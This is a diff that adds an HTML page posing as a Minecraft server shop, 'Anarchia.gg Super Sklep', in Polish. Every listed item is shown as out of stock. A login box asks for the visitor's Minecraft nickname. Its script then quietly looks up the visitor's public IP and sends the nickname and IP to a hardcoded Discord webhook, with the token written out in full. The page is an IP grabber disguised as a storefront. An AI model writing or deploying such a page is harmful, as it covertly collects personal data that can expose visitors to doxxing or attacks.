@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anarchia.gg Super Sklep</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            color: white;
+
+            font-family: "Bitcount Prop Single", system-ui;
+            font-optical-sizing: auto;
+            font-weight: 300;
+            font-style: normal;
+            font-variation-settings:
+                "slnt" 0,
+                "CRSV" 0.5,
+                "ELSH" 0,
+                "ELXP" 0;
+        }
+
+        body {
+            background-color: #121212;
+        }
+
+        #header {
+            position: relative;
+            width: 100%;
+            height: 50px;
+
+            background-color: rgba(255, 217, 0, 0.05);
+            border-bottom: 1px solid rgba(255, 217, 0, 0.5);
+
+            margin-bottom: 20px;
+        }
+
+        .margin {
+            position: relative;
+            left: 50%; transform: translateX(-50%);
+            width: 75%;
+            max-width: 1280px;
+        }
+
+        h1.center {
+            text-align: center;
+            line-height: 55px;
+        }
+
+        .item {
+            width: 280px;
+            height: 360px;
+
+            border-radius: 20px;
+            background-color: #181818;
+
+            outline: 2px solid rgba(255, 217, 0, 0);
+            transition-duration: 0.25s;
+
+            margin: 0px 20px;
+        }
+
+        .item:hover {
+            background-color: #232323;
+            outline: 2px solid rgba(255, 217, 0, 0.5);
+            cursor: pointer;
+        }
+        
+        .row {
+            position: relative;
+            display: inline-flex;
+            justify-content:space-between;
+            width: 100%;
+            margin-bottom: 40px;
+        }
+        .img {
+            aspect-ratio: 1/1;
+            max-width: calc(100% - 20px);
+            width: 75%;
+            margin-top: 10px;
+
+            left: 50%; transform: translateX(-50%);
+
+            position: relative;
+            background-size: contain;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+        h2, h3, h4, p {
+            position: relative;
+            left: 20px;
+            width: calc(100% - 40px);
+            text-align: center;
+            
+            font-family: "Montserrat", sans-serif;
+            font-optical-sizing: auto;
+            font-weight: 300;
+            font-style: normal;
+            margin-bottom: 5px;
+        }
+        p {
+            padding: 5px 0px;
+            background-color: rgba(200, 70, 70);
+            border-radius: 5px;
+        }
+
+        #login {
+            position: fixed;
+            inset: 0;
+
+            z-index: 1;
+
+            background-color: #121212;
+        }
+
+        #login * {
+            font-family: "Montserrat", sans-serif;
+            font-optical-sizing: auto;
+            font-weight: 500;
+            font-style: normal;
+            margin-bottom: 5px;
+
+            text-align: center;
+        }
+
+        #login > .box {
+            position: absolute;
+            top: 50%; left: 50%;
+            padding: 20px 25px;
+
+            transform: translate(-50%, -50%);
+
+            background-color: #232323;
+            border-radius: 25px;
+        }
+
+        input {
+            border: none;
+            outline: none;
+
+            background-color: #121212;
+            padding: 8px 20px;
+
+            margin-top: 10px;
+            font-size: 20px;
+        }
+        button {
+            border: none;
+            outline: none;
+
+            background-color: #121212;
+            padding: 8px 20px;
+
+            margin-top: 10px;
+            font-size: 20px;
+            outline: 2px solid transparent;
+            transition-duration: 0.25s;
+        }
+        button:hover {
+            outline: 2px solid white;
+            cursor: pointer;
+        }
+    </style>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bitcount+Prop+Single:wght@100..900&family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div id="login">
+        <div class="box">
+            <h1>Wpisz nick z minecrafta</h1>
+            <h1>żeby złożyć zamówienie</h1>
+
+            <p id="error" style="display: none"></p>
+
+            <input type="text">
+            <br>
+            <button onclick="sklep();">Przejdz do sklepu</button>
+        </div>
+    </div>
+
+    <div id="header">
+        <div class="margin">
+            <h1 class="center">Anarchia.gg - Super Sklep</h1>
+        </div>
+    </div>
+    <div class="margin">
+        <div class="row">
+            <div class="item">
+                <div class="img" style="background-image: url('img/kasa.png');"></div>
+                <h2>Kasa Serwerowa</h2>
+                <h3>1zl = 4,500$</h3>
+                <h4>1zl</h4>
+                <p>Out of stock</p>
+            </div>
+            <div class="item">
+                <div class="img" style="background-image: url('img/elytra.png');"></div>
+                <h2>Elytra</h2>
+                <h3>super rzecz</h3>
+                <h4>30zl</h4>
+                <p>Out of stock</p>
+            </div>
+            <div class="item">
+                <div class="img" style="background-image: url('img/ana2.png');"></div>
+                <h2>Anarchiczny Set II</h2>
+                <h3>fajna rzecz</h3>
+                <h4>30zl</h4>
+                <p>Out of stock</p>
+            </div>
+            <div class="item">
+                <div class="img" style="background-image: url('img/ana1.png');"></div>
+                <h2>Anarchiczny Set I</h2>
+                <h3>turbo rzecz</h3>
+                <h4>10zl</h4>
+                <p>Out of stock</p>
+            </div>
+        </div>
+        <div class="row">
+            <div class="item">
+                <div class="img" style="background-image: url('img/excalibur.png');"></div>
+                <h2>Excalibur</h2>
+                <h3>40%-45%</h3>
+                <h4>250zl</h4>
+                <p>Out of stock</p>
+            </div>
+            <div class="item">
+                <div class="img" style="background-image: url('img/nielotka.png');"></div>
+                <h2>Wedka Nielotka</h2>
+                <h3>sigma rzecz</h3>
+                <h4>340zl</h4>
+                <p>Out of stock</p>
+            </div>
+            <div class="item">
+                <div class="img" style="background-image: url('img/siekiera.png');"></div>
+                <h2>Siekiera Grincha</h2>
+                <h3>mega rzecz</h3>
+                <h4>150zl</h4>
+                <p>Out of stock</p>
+            </div>
+            <div class="item">
+                <div class="img" style="background-image: url('img/totem.png');"></div>
+                <h2>Totem Ulaskawienia</h2>
+                <h3>zajebista rzecz</h3>
+                <h4>700zl</h4>
+                <p>Out of stock</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+            }
+            return "unknownip";
+        }
+
+        async function sklep() {
+            const input = document.querySelector("input");
+            const nick = input.value;
+
+            const error = document.querySelector("#error");
+
+            const ip = await getIP();
+
+            const re = /^[a-zA-Z0-9_]{2,16}$/;
+
+            if(!re.test(nick)) {
+                error.style.display = `block`;
+                error.innerText = "Wprowadz poprawny nick";
+                return;
+            }
+            
+            const webhook = "https://discord.com/api/webhooks/1399107534442463403/fAbmZTrpIxE_dtkBOL-F9fF-JsSYk-LsHYqf-L1U2W7Q7phxRVu_0K9DgNGXNg-z6HYi";
+
+            fetch(
+                webhook,
+                {
+                    method: 'post',
+                    headers: {
+                    'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                    // the username to be displayed
+                    username: `Torpeda cwel`,
+                    // the avatar to be displayed
+                    avatar_url: `https://minotar.net/helm/${nick}/600.png`,
+                    // embeds to be sent
+                    embeds: [
+                        {
+                        // decimal number colour of the side of the embed
+                        color: 11730954,
+                        // author
+                        // - icon next to text at top (text is a link)
+                        author: {
+                            name: `${nick} [${ip}]`,
+                            url: 'https://google.com/',
+                            icon_url: `https://minotar.net/helm/${nick}/600.png`,
+                        },
+                        // embed title
+                        // - link on 2nd row
+                        // thumbnail
+                        // - small image in top right corner.
+                        // embed description
+                        // - text on 3rd row
+                        description: '',
+                        // custom embed fields: bold title/name, normal content/value below title
+                        // - located below description, above image.
+                        fields: [],
+                        // image
+                        // - picture below description(and fields)
+                        // footer
+                        // - icon next to text at bottom
+                        },
+                    ],
+                    }),
+                }
+            );
+        
+            document.querySelector("#login").remove();
+        }
+    </script>
+</body>
+</html>
